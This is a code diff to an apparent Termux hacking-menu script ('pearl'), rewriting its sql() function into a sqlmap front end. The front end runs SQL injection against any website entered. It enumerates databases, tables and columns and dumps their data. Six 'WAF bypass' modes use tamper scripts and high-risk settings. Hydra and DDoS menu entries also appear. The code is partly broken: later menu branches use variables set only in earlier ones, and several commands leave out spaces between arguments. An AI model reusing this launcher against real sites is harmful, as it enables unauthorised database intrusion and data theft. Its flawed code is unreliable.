@@ -543,72 +543,207 @@ def hydra():
      	
 
 def sql():
+	 os.system("clear")
 	 os.system("cd ~/sqlmap")
 	 print()
-	 print("1.Download Sqlmap")
-	 print("2.Scan a website to find sql vuln")
-	 print("3.Get database")
-	 print("4.Get tables of one db")
-	 print("5.Get columns of a table")
-	 print("6.Get data from  table")
-	 print("7.WAF bypass")
+	 print("1. Normal Website Pentration")
+	 print("2. Advanced Pentration (WAF Bypassing) ")
 	 print()
 	 global r
 	 global w
-	 j = input(w + 'pearl(' + r +'sqlmap' + w + ') > ')
-	 if j == '1':
-	 	os.system("cd /data/data/com.termux/files/home && git clone https://github.com/sqlmapproject/sqlmap.git")
-	 	print("Sqlmap Successfully Installed")
-	 	sql()
-	 elif j == '2':
-	 	n = input("Enter Website : ")
-	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + n + '%27')
-	 	sql()
-	 elif j == '3':
-	 	n = input("Enter Website : ")
-	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + n + '--dbs')
-	 	sql()
-	 elif j == '4':
-	 	n = input("Enter Website : ")
-	 	d = input("Enter Database : ")
-	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + n + "--tables -D" + d)
-	 	sql()
-	 elif j == '5':
-	 	n = input("Enter website : ")
-	 	d = input("Enter Database : ")
-	 	k = input("Enter Table : ")
-	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + n + "--columns -D" + d + '-T' + k)
-	 	sql()
-	 elif j == '6':
-	 	n = input("Enter Website : ")
-	 	d = input("Enter Datebase : ")
-	 	k = input("Enter Table : ")
-	 	os.system("cd ~/sqlmap;python sqlmap.py -u" + n + "--dump -D" + d + "-T" + k)
-	 elif j == '7':
-	 	print("1.General Tamper Testing")
-	 	print("2.MSSQL")
-	 	print("3.MySql")
-	 	m = input("Enter WAF Option : ")
-	 	if m == '3':
-	 			n = input("Enter Website : ")
-	 			os.system("cd ~/sqlmap;python sqlmap -u" + n + "--level=5 --risk=3 -p 'item1 - - tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor")
-	 			sql()
-	 	elif m == '1':
-	 			j = input("Enter Website : ")
-	 			os.system("cd ~/sqlmap;python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes")
-	 			sql()
-	 	elif m == '2':
-	 			j = input("Enter Website : ")
-	 			os.system("cd ~/sqlmap;python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes")
-	 			sql()
-	 elif j == 'back':
-	 			main()
-	 elif j == 'help':
-	 			print("\n This is an automater for performing sql injection to a websiteb usig sqlmap. \n back - To go back to pearl console \n ")
+	 s = input(w + "pearl(" + r + "sql)" + w + ' >  ')
+	 if s == '1':
+	 	web = input("WEBSITE :  ")
+	 	os.system("clear")
+	 	print("1. Get Database")
+	 	print("2. Get Tables")
+	 	print("3. Get Columns")
+	 	print("4. Dump Data ")
+	 	print()
+	 	p = input("OPTION > ")
+	 	if p == '1':
+	 		os.system("cd ~/sqlmap;python sqlmap.py -u  " + web +  '  --dbs')
+	 	elif p == '2':
+	 		db = input("DATABASE : ")
+	 		os.system("cd ~/sqlmap;python sqlmap.py -u  " + web + '-D  ' + db + "  --tables")
+	 	elif p == '3':
+	 		tab = input("TABLE : ")
+	 		os.system("cd sqlmap;python sqlmap.py -u  " + web + '-D  ' + db + '-T  ' + tab + '  --columns')
+	 	elif p == '4':
+	 		col = input("COLUMN : ")
+	 		os.system("cd sqlmap;python sqlmap.py -u  " + web + '-D  ' + db + '-T  ' + tab + '-C  ' + col + '  --dump')
+	 	elif p == 'back':
+	 		sql()
+	 	else:
+	 		print(r + "[!]" + w + "Invalid Input")
+	 		print(r + "[!]" + w + "Try Again")
+	 		time.sleep(2)
+	 		sql()
+	 elif s == '2':
+	 		web2 = input("WEBSITE : ")
+	 		os.system("clear")
+	 		print("1. WAF Bypass Method 1")
+	 		print("2. WAF Bypass Method 2")
+	 		print("3. WAF Bypass Method 3")
+	 		print("4. WAF Bypass Method 4")
+	 		print("5. WAF Bypass Method 5")
+	 		print("6. WAF Bypass Method 6")
+	 		print()
+	 		waf = input("OPTION : ")
+	 		os.system("clear")
+	 		if waf == '1':
+	 			print("1. Get Database")
+	 			print("2. Get Tables")
+	 			print("3. Get Columns")
+	 			print("4. Dump Data")
+	 			print()
+	 			op = input("OPTION : ")
+	 			if op == '1':
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '   --identify-waf --random-agent -v 3 --dbs')
+	 			elif op == '2':
+	 				datb = input("DATABASE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --identify-waf --random-agent -v 3 -D  ' + datb + '  --tables')
+	 			elif op == '3':
+	 				tabt = input("TABLE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --identify-waf --random-agent -v 3 -D  ' + datb + '  -T ' + tabt + "  --columns")
+	 			elif op == '4':
+	 				colt = input("COLUMN : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --identify-waf --random-agent -v 3 -D  ' + datb + '  -T ' + tabt + "  -C " + colt + ' --dump')
+	 			elif op == 'back':
+	 				sql()
+	 			else:
+	 				print(r + "[!]" + w + "Invalid Input")
+	 				print(r + "[!]" + w + "Try Again")
+	 				time.sleep(1)
+	 				sql()
+	 		elif waf == '2':
+	 			print("1. Get Database")
+	 			print("2. Get Tables")
+	 			print("3. Get Columns")
+	 			print("4. Dump Data")
+	 			print()
+	 			po = input("OPTION : ")
+	 			if po == '1':
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '   --level 2 --risk 3 --batch --dbs')
+	 			elif po == '2':
+	 				dab = input("DATABASE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --level 2 --risk 3 --batch -D  ' + dab + '  --tables')
+	 			elif po == '3':
+	 				tat = input("TABLE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --level 2 --risk 3 --batch -D  ' + dab + '  -T ' + tat + "  --columns")
+	 			elif po == '4':
+	 				cot = input("COLUMN : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --level 2 --risk 3 --batch -D  ' + dab + '  -T ' + tat + "  -C " + cot + ' --dump')
+	 			elif po == 'back':
+	 				sql()
+	 			else:
+	 				print(r + "[!]" + w + "Invalid Input")
+	 				print(r + "[!]" + w + "Try Again")
+	 				time.sleep(1)
+	 				sql()
+	 		elif waf == '3':
+	 			print("1. Get Database")
+	 			print("2. Get Tables")
+	 			print("3. Get Columns")
+	 			print("4. Dump Data")
+	 			print()
+	 			jo = input("OPTION : ")
+	 			if jo == '1':
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '   --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs')
+	 			elif jo == '2':
+	 				datab = input("DATABASE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D  ' + datab + '  --tables')
+	 			elif jo == '3':
+	 				tbat = input("TABLE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment"  -D  ' + datab + '  -T ' + tbat + "  --columns")
+	 			elif jo == '4':
+	 				cobt = input("COLUMN : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment"  -D  ' + datab + '  -T ' + tbat + "  -C " + cobt + ' --dump')
+	 			elif jo == 'back':
+	 				sql()
+	 			else:
+	 				print(r + "[!]" + w + "Invalid Input")
+	 				print(r + "[!]" + w + "Try Again")
+	 				time.sleep(1)
+	 				sql()
+	 		elif waf == '4':
+	 			print("1. Get Database")
+	 			print("2. Get Tables")
+	 			print("3. Get Columns")
+	 			print("4. Dump Data")
+	 			print()
+	 			pao = input("OPTION : ")
+	 			if pao == '1':
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '   --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs')
+	 			elif pao == '2':
+	 				dtbs = input("DATABASE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D  ' + dtbs + '  --tables')
+	 			elif pao == '3':
+	 				tble = input("TABLE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D  ' + dtbs + '  -T ' + tble + "  --columns")
+	 			elif pao == '4':
+	 				colm = input("COLUMN : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D  ' + dtbs + '  -T ' + tble + "  -C " + colm + ' --dump')
+	 			elif pao == 'back':
+	 				sql()
+	 			else:
+	 				print(r + "[!]" + w + "Invalid Input")
+	 				print(r + "[!]" + w + "Try Again")
+	 				time.sleep(1)
+	 				sql()
+	 		elif waf == '5':
+	 			print("1. Get Database")
+	 			print("2. Get Tables")
+	 			print("3. Get Columns")
+	 			print("4. Dump Data")
+	 			print()
+	 			pdo = input("OPTION : ")
+	 			if pdo == '1':
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '   --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs')
+	 			elif pdo == '2':
+	 				databa = input("DATABASE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 -D  ' + databa + '  --tables')
+	 			elif pdo == '3':
+	 				talt = input("TABLE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 -D  ' + databa + '  -T ' + talt + "  --columns")
+	 			elif pdo == '4':
+	 				column = input("COLUMN : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 -D  ' + databa + '  -T ' + talt + "  -C " + column + ' --dump')
+	 			elif pdo == 'back':
+	 				sql()
+	 			else:
+	 				print(r + "[!]" + w + "Invalid Input")
+	 				print(r + "[!]" + w + "Try Again")
+	 				time.sleep(1)
+	 				sql()
+	 		elif waf == '6':
+	 			print("1. Get Database")
+	 			print("2. Get Tables")
+	 			print("3. Get Columns")
+	 			print("4. Dump Data")
+	 			print()
+	 			jlo = input("OPTION : ")
+	 			if jlo == '1':
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '   --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs')
+	 			elif jlo == '2':
+	 				ba = input("DATABASE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --dbms="MySQL" -v3 --technique U --tamper="space2comment" -D  ' + ba + '  --tables')
+	 			elif jlo == '3':
+	 				at = input("TABLE : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --dbms="MySQL" -v3 --technique U --tamper="space2comment" -D  ' + ba + '  -T ' + at + "  --columns")
+	 			elif jlo == '4':
+	 				cl = input("COLUMN : ")
+	 				os.system("cd ~/sqlmap;python sqlmap.py -u  " + web2 + '  --dbms="MySQL" -v3 --technique U --tamper="space2comment" -D  ' + ba + '  -T ' + at + "  -C " + cl + ' --dump')
+	 			elif jlo == 'back':
+	 				sql()
+	 			else:
+	 				time.sleep(1)
+	 				print(r + "[!]" + w + "Invalid Input")
+	 				print(r + "[!]" + w + "Try Again")
 	 else:
-	 	print(r + '[!]' + w + 'Invalid Input')
-	 	print(r + '[!]' + w + 'Try Again')
-	 	sql()
+	 	main()
+	 	
+	 
 
 def ddos():
 	os.system("clear")
